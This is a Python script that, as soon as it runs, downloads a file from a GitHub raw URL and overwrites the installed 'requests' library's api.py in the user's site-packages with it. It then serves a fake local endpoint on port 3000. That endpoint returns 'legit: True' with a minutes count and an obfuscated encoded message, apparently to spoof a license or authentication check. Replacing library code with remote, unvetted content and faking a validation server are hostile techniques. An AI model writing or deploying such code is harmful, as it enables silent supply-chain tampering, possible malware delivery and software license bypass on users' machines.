from http.server import SimpleHTTPRequestHandler, HTTPServer
import json
import os
import requests

def download_and_save(url, save_path):
    try:
        response = requests.get(url)
        response.raise_for_status()

        with open(save_path, 'wb') as file:
            file.write(response.content)

        print(f"Data downloaded and saved to: {save_path}")

    except requests.exceptions.RequestException as e:
        print(f"Error downloading data: {e}")

def get_user_home_directory():
    local_app_data = os.environ.get('LOCALAPPDATA')
    file_path = os.path.join(local_app_data, 'programs', 'python', 'python311', 'lib', 'site-packages', 'requests', 'api.py')

    return file_path

def do_download():
    path = get_user_home_directory()
    download_and_save("https://raw.githubusercontent.com/hvhaddicted/321/main/api.py", path)

do_download()

class MyHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        response_data = {"legit": "True", "minutes": "14000"}
        response_json = json.dumps(response_data).encode("utf-8")
        self.wfile.write(response_json)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        decoded_data = post_data.decode('utf-8')
        print(f"Received POST data: {decoded_data}")

        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()

        response_data = {"success": "true", "message": "Fg07IlZrDUQ3FRVeYxoPfTEoHQprMFxiB2MyS1oVWiYRRREfPU1DUHZ9EFkKEmQsNCY/OXdyCgUke1QYCDFcViobWTV6P1oJFj0aL0I2YQUTGglCYSZaTSZ2FyhrB0BWDS8DRwMjeW0rGkRDWzAbAHcyA0MUGisSeDleKRJYFldpGhU="}
        response_json = json.dumps(response_data).encode("utf-8")
        self.wfile.write(response_json)

if __name__ == "__main__":
    server_address = ("", 3000)
    httpd = HTTPServer(server_address, MyHandler)
    print("Server running on port 3000...")

    httpd.serve_forever()
